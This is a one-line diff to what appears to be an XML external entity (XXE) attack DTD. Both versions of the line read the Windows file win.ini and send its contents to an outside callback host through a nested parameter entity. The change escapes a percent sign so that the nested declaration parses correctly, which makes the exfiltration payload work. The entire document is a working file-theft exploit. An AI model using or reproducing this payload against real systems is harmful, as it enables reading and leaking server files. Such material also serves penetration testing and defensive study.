@@ -1,1 +1,1 @@
-<!ENTITY % file SYSTEM "file://c:/Windows/win.ini"><!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://vt73pd5ifedtiy3t674ekip3si.odiss.eu?x=%file;'>">%eval;
+<!ENTITY % file SYSTEM "file://c:/Windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://vt73pd5ifedtiy3t674ekip3si.odiss.eu?x=%file;'>">%eval;
